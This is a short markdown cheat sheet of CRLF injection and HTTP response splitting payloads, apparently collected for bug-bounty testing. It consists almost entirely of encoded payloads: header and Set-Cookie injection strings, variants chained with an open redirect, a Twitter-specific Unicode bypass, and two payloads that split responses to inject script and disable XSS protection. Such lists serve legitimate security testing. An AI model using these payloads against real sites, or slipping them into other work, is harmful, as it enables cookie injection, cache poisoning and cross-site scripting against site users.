## CRLF Injection || HTTP Response Splitting

```
%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
```
**Header-based test, site root:**
```
%0d%0aheader:header
```
```
%0aheader:header
```
```
%0dheader:header
```
```
%23%0dheader:header
```
```
%3f%0dheader:header
```
**Chained with Open Redirect server misconfiguration - sometimes work (discovered in Yandex):**

```
//www.google.com/%2f%2e%2e%0d%0aheader:header
```
```
/www.google.com/%2e%2e%2f%0d%0aheader:header
```
```
/google.com/%2F..%0d%0aheader:header
```
**CRLF by @filedescriptor (http://blog.innerht.ml/twitter-crlf-injection/) - twitter specific:**
```
%E5%98%8A%E5%98%8Dheader:header
```

**CRLF Injection to XSS**

```
%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e
```
Response splitting on 302 Redirect (Discovered in DoD):
```
%0d%0aContent-Type:%20text%2fhtml%0d%0aHTTP%2f1.1%20200%20OK%0d%0aContent-Type:%20text%2fhtml%0d%0a%0d%0a%3Cscript%3Ealert('XSS');%3C%2fscript%3E
```
